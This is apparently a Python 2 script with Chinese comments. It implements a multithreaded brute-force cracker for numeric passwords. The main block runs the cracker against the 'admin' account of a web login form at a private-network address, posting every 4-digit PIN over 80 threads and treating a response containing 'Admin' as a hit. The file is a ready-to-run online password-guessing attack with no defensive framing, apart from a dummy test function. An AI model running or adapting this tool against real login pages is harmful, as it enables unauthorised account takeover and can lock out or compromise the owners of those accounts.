# -*- coding: utf-8 -*-
import urllib,urllib2
import threading,time

class nPasswdTester(threading.Thread):
    """口令测试线程"""
    def __init__(self,usr,pLen,pRange,pTest,callback):
        """口令测试任务初始化 
        usr用户名 pLen口令长度 pRange测试区间 
        pTest(usr,pas)测试入口 callback(pas)结果反馈回调"""
        super(nPasswdTester, self).__init__()
        self.rest=0.002; self._i=0
        self.thread_stop=False
        self.progress=0
        self.usr=usr
        self.pRange=pRange
        self.pTest=pTest
        self.pLen=pLen
        prtype,(self.xstart,self.xend,prstep)=pRange.__reduce__()
        self.xend-=1
        assert self.xstart>=0 and self.xend>self.xstart and prstep>=1
        assert callback; self.callback=callback

    def run(self):
        """口令测试任务"""
        for i in self.pRange:
            if not self.thread_stop:
                pas='{{:0{}}}'.format(self.pLen).format(i); self._i=i
                self.progress=(i-self.xstart)*100/(self.xend-self.xstart)
                if self.pTest(self.usr,pas): 
                    self.callback(pas)
                    break
            else: break
            time.sleep(self.rest)
        else: self.callback(None)
            
    def stop(self):
        """终止任务"""
        self.thread_stop=True

    def report(self):
        """报告进度（百分比）"""
        return self.progress

    def snapshot(self):
        """快照剩余的测试区间"""
        return xrange(self._i,self.xend+1)

class nPasswdCracker(object):
    """多线程口令攻击"""
    def __init__(self,usr,pTest,callback,pLen,forks=8,ranges=None):
        """口令测试任务初始化 
        usr用户名 pLen口令长度 forks线程数 ranges测试区间集（任务恢复时使用） 
        pTest(usr,pas)测试入口 callback(pas)结果反馈回调"""
        super(nPasswdCracker, self).__init__()
        assert callback
        assert pLen>0
        self.callback=callback
        self.once=False
        self.pLen=pLen
        self.resultCt=0
        if ranges: self.ranges=ranges
        else:
            m=10**pLen/forks
            self.ranges=[]
            for i in xrange(forks):
                if i!=forks-1: self.ranges.append( xrange(i*m,(i+1)*m) )
                else: self.ranges.append( xrange(i*m,10**pLen-1) )
        onfinish=lambda p:self._onfinish(p)
        self.testers=[nPasswdTester(usr,self.pLen,r,pTest,onfinish) for r in self.ranges]

    def run(self):
        """启动多线程口令攻击"""
        assert not self.once; self.once=True
        for t in self.testers: t.start()

    def stop(self):
        """终止所有任务 注：终止后可以从self.ranges获得剩余测试区间集以便任务恢复"""
        self.ranges=[t.snapshot() for t in self.testers]
        for t in self.testers: t.stop()

    def report(self):
        """报告所有任务进度"""
        return [t.report() for t in self.testers]

    def _onfinish(self,p):
        if p:
            self.stop()
            self.callback(p)
        else:
            self.resultCt+=1
            if self.resultCt==len(self.testers):
                self.callback(None)
 

cookies = urllib2.HTTPCookieProcessor()
attacker = urllib2.build_opener(cookies)
targeturl = 'http://192.168.56.101/login?next=%2Fadmin'
assert targeturl # 运行以前要先对targeturl初始化，这是HTTP POST的目标URL，如'http://192.168.1.14:8998/login?next=%2Fadmin'

def passtest_loophole(usr,pas):
    tmp='txtUser={}&txtPasswd={}'
    request = urllib2.Request(url=targeturl,data=tmp.format(usr,pas))
    r=attacker.open(request)
    strr=r.read()
    #print strr

    if 'Admin' in strr: return True
    else : return False

def passtest_test(usr,pas):
    """虚拟测试入口，用于测试多线程攻击程序"""
    return usr=='admin' and pas=='871995'

def pasok(p):
    """测试结果回调"""
    global theend,passstr
    passstr='\nPASS {}'.format(p)
    theend=True

if __name__ == '__main__':
    theend=False
    passstr=None
    
    usr='admin'
    #c=nPasswdCracker(usr,passtest_test,pasok,pLen=6,forks=200)
    c=nPasswdCracker(usr,passtest_loophole,pasok,pLen=4,forks=80)
    print 'Attacking',usr

    print 'Testing within:'
    print c.ranges
    print 'Testing...\n'
    c.run()

    while not theend:
        time.sleep(0.24)
        print '-- ',
        for r in c.report():
            print '{:3}%  '.format(r),
        print '\n'

    if passstr:print passstr
    else:print '<Fail>'
